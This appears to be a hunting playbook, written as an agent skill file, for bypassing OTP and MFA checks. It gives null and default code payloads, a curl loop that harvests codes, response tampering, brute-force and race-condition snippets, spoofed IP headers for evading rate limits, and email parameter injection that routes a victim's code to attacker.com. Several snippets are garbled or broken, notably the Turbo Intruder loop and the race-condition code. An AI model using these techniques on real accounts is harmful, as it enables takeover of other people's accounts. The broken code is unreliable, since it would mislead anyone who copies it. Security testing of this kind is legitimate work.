---
name: hunt-otp
description: OTP / MFA bypass — response tampering, code brute force, race conditions, null/123456 codes, weak entropy, response leakage, account linking, OTT flows. Pairs with hunt-auth-bypass, hunt-race, credential-attack.
---

# OTP & MFA BYPASS — Advanced Guide

**Core:** OTP/MFA is only as strong as the *verification decision*. Every bypass in the wild reduces to four attack surfaces: (1) the code value, (2) the comparison, (3) the delivery/flow state, (4) the rate limit. Test all four before concluding MFA is solid.

## 1. CODE VALUE ATTACKS

### Null / Predictable / Default Values
```http
POST /api/verify-otp HTTP/1.1
{"otp":""}            ← empty string
{"otp":null}          ← JSON null (deserializes to Option::None treated as "no OTP"?)
{"otp":"000000"}
{"otp":"123456"}
{"otp":"00000"} ... "111111"
```
- Some backends initialize the pending-OTP field as empty/`0000`. If verification is implemented as "input matches stored", an unset field matches empty input.
- Sequential generation: request several OTPs to yourself with different accounts; check for incrementing or timestamp-derived codes (e.g. TOTP-style 30s windows, or `hash(user+minute)`).

### Weak Entropy
```bash
# Request 20 codes for your own account and analyze
for i in $(seq 1 20); do
  curl -sn "https://target/api/resend-otp" | grep -oE "[0-9]{4,8}" 
done
# Look for: PHP rand() (linear), 3-digit space (1000 tries), codes reused across sessions
```

## 2. COMPARISON / RESPONSE ATTACKS

### Response Manipulation (client-side gate)
```javascript
// The API returns {success:false}; the FLOW is gated in JS:
Intercept → change {"success":false} → {"success":true,"user_id":"victim_id"}
```
- Works when the next page is rendered client-side from the response. Confirm server-side: replay the authenticated request directly — if you keep the session and can call `/api/profile`, only the UI was enforcing MFA.

### Code Leakage in Response
```http
POST /api/resend HTTP/1.1 200
{"otp":"847193" ...}   ← code echoed to client (also: verify response to another user's resend with their number)
```
- Also check: password-reset endpoint with `?debug=1`, response to *your own* flow after changing `X-Forwarded-For`, `User-Agent`, or the request body's user id — some templates leak the OTP when the "session" doesn't match a strict server-side check.

### Brute Force (when they removed the limit)
```javascript
// Turbo Intruder: 6-digit space = 1M; 4-digit = 10k is instant
def attempt():
  for code in "0123456789":
    engine.queue(target.req, code, gate=1)
open_gates() → checks 10 codes per TCP burst
```
- Watch for `X-Rate-Limit` headers only counting *windows*, not attempts, and rate limits keyed on IP (rotate via `X-Forwarded-For` when the backend trusts it).

## 3. FLOW / STATE ATTACKS

### Skipping the Second Step
```
1. POST /login {user, pass}  → response: "otp step required", session J S TID
2. WITHOUT verifying OTP, call:  GET /api/user/me   (or any post-auth endpoint)
3. If data returns → the login response already set a *fully privileged* cookie and the OTP step is UI-only.
```
- Variants: response of step 1 contains the *final* token; login sets `authenticated=1`; OTP verify only *renders* a second screen.

### OTP Caching Across Accounts / Flows
```
1. Trigger OTP for EMAIL to own account A
2. Attack flow: request reset for VICTIM, but the OTP for the *victim* is sent to your email because of an account-link bug (email parameter injection: `email=victim%00a@attacker.com`, `email[]`, unicode, plus-addressing, uppercase normalization)
```

### Reset vs Login Flow Confusion
```
Password-reset OTP verified → server rotates session AND clears "must-verify-MFA" flag
→ verify reset OTP (which you can receive), land post-auth, MFA state was satisfied by the WRONG flow's code
```

## 4. RATE-LIMIT & VERIFICATION-BYPASS HEADERS
```http
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: target.com
CF-Connecting-IP: <another-real-user>  ← only stunning if trusted; do not report as a bug without proof
```
- When a per-account limit exists but per-IP limits are keyed on these headers, rotate them.
- Also try verify endpoint method change (GET/POST/PATCH), content-type flip (json→xml→form), or duplicate body params (`{"otp":"111111","otp":"159753"}`) — some stacks parse the last/first only, while the *limiter* saw the first.

## 5. RACE CONDITION (single-attempt OTP)
```javascript
session.addEventListener('progress', async () => {
  ff.reset(); // punch out the OTP chip once with N parallel verifies
})
```
- Single-use OTPs defeated by sending 5-10 verify requests simultaneously (race window on "mark as used"). Use Turbo Intruder gate mode; pair with `hunt-race`.

## REPORTING CHECKLIST
- Reproduce with curl (no client manipulation required for server-side bugs; client-side gates also count but must show server impact).
- Reset ALL artifacts between tests (new email address, fresh session) so the fix can be differentiated from caching.
- State precisely which layer was bypassed: code generation, code validation, flow control, or rate limiting.
- Show evidence notes: exact code/response pairs — **these must be reproduced in report writing**; no inferred "should work".
